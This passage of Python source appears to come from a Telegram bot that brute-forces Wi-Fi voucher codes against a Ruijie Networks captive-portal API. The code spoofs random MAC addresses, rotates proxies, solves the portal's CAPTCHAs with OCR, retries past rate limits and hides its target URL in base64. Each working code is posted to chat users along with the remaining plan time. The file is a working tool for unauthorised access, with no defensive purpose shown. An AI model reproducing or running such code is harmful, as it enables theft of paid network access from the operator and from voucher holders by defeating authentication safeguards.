    return ':'.join(f'{x:02x}' for x in [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)])

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
    headers = {'user-agent': 'Mozilla/5.0'}
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True, proxy=get_proxy()) as req:
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            if session_id:
                return session_id.group(1)
            return previous_session_id
    except:
        return previous_session_id

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    response = None
    
    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                return
            
            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if text and await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                except:
                    pass
            if not auth_code:
                return

            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
            
            try:
                async with task_session.post(post_url, json=data, headers=headers, proxy=get_proxy()) as req:
                    response = await req.text()
            except:
                return
        if response and 'request limited' in response:
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        
        expire_date, _ = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
        
        if message:
            try:
                await bot.send_message(chat_id=message.chat.id, text=f"Success Code Found:\n🎫 {code}\n{expire_date}")
            except:
                pass

async def Code_Expires_Date(active_id):
    url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}'
    headers = {'user-agent': 'Mozilla/5.0'}
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as s:
            async with s.get(url, headers=headers, proxy=get_proxy()) as req:
                if req.status == 200:
                    res = await req.json()
                    if res.get('success'):
                        result = res.get('result', {})
                        mins = result.get('totalMinutes', 'Unknown')
                        profile = result.get('profileName', 'Unknown')
                        return f"📋 Plan: {profile} | ⏳ Time: {mins}m", mins
    except:
        pass
    return "📋 Plan: Unknown | ⏳ Time: Unknown", 'Unknown'

_ocr = ddddocr.DdddOcr(show_ad=False)
async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr.classification, image_bytes)

async def Captcha_Image(session, session_id):
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, proxy=get_proxy()) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json=json_data, proxy=get_proxy()) as req:
        data = await req.json()
        return data.get("success") == True

async def start_polling():
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except:
            await asyncio.sleep(5)

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=20000, ssl=False)
    session = aiohttp.ClientSession(connector=_connector, connector_owner=False)
    try:
        # ပြင်ဆင်ထားသည့်နေရာ (async အစား await သုံးထားသည်)
        await asyncio.gather(web_server(), github_update_scheduler(), start_polling())
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
